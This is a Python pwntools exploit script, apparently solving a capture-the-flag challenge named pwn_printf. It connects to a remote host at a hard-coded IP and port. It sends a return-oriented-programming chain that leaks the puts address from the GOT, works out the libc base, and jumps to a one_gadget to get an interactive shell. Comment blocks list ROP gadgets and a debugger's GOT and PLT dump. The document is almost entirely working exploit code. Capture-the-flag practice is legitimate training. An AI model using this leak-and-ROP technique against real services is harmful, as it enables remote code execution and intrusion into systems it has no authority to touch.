#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

# p = process('./pwn_printf')
p = remote('47.111.96.55', 55206)
# gdb.attach(p, 'b *0x0x4007e7\nb *0x4007ED\n')

bss = 0x603080 + 0x500
func_pwn = 0x4007C6
pop_rdi_ret = 0x0000000000401213
pop_rsi2ret = 0x0000000000401211


puts_got = 0x603018
puts_plt = 0x400640
leave_ret = 0x00000000004007ed
read_plt = 0x400670

'''
============================================================
0x000000000040119a : pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x000000000040120c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040119c : pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x000000000040120e : pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040119e : pop r14 ; pop r15 ; pop rbp ; ret
0x0000000000401210 : pop r14 ; pop r15 ; ret
0x00000000004011a0 : pop r15 ; pop rbp ; ret
0x0000000000401212 : pop r15 ; ret
0x000000000040120b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040119d : pop rbp ; pop r14 ; pop r15 ; pop rbp ; ret
0x000000000040120f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400730 : pop rbp ; ret
0x00000000004011a1 : pop rdi ; pop rbp ; ret
0x0000000000401213 : pop rdi ; ret
0x000000000040119f : pop rsi ; pop r15 ; pop rbp ; ret
0x0000000000401211 : pop rsi ; pop r15 ; ret
0x000000000040119b : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x000000000040120d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400629 : ret
0x0000000000400662 : ret 0x2029
0x000000000040114f : ret 0x850f
0x00000000004007de : ret 0x8948
0x00000000004008ca : ret 0xfffd
'''
'''
pwndbg> got

GOT protection: Partial RELRO | GOT functions: 8

[0x603018] puts@GLIBC_2.2.5 -> 0x7fac362d89c0 (puts) __ push   r13
[0x603020] mmap@GLIBC_2.2.5 -> 0x7fac363739d0 (mmap64) __ test   r9d, 0xfff
[0x603028] setbuf@GLIBC_2.2.5 -> 0x7fac362e04d0 (setbuf) __ mov    edx, 0x2000
[0x603030] read@GLIBC_2.2.5 -> 0x400676 (read@plt+6) __ push   3
[0x603038] __libc_start_main@GLIBC_2.2.5 -> 0x7fac36279ab0 (__libc_start_main) __ push   r13
[0x603040] memcpy@GLIBC_2.14 -> 0x7fac363e6ad0 (__memmove_avx_unaligned_erms) __ mov    rax, rdi
[0x603048] __isoc99_scanf@GLIBC_2.7 -> 0x7fac362d3ec0 (__isoc99_scanf) __ push   rbx
[0x603050] sprintf@GLIBC_2.2.5 -> 0x4006b6 (sprintf@plt+6) __ push   7
pwndbg> plt
0x400640: puts@plt
0x400650: mmap@plt
0x400660: setbuf@plt
0x400670: read@plt
0x400680: __libc_start_main@plt
0x400690: memcpy@plt
0x4006a0: __isoc99_scanf@plt
0x4006b0: sprintf@plt
''' 

if __name__ == "__main__":
  p.recvuntil('You will find this game very interesting')
  for i in range(16):
    # p.sendline('%d'%(i + 1))
    p.sendline('%d'%(0x20))
  payload = p64(bss) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi_ret) + p64(0x100) + p64(func_pwn)
  p.sendline(payload)
  leak = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x06f6a0
  success('LEAK:\t' + str(hex(leak)))
  og = [0x45226, 0x4527a, 0xf0364, 0xf1207]
  payload = p64(bss) + p64(og[1] + leak)
  p.sendline(payload)

  p.interactive()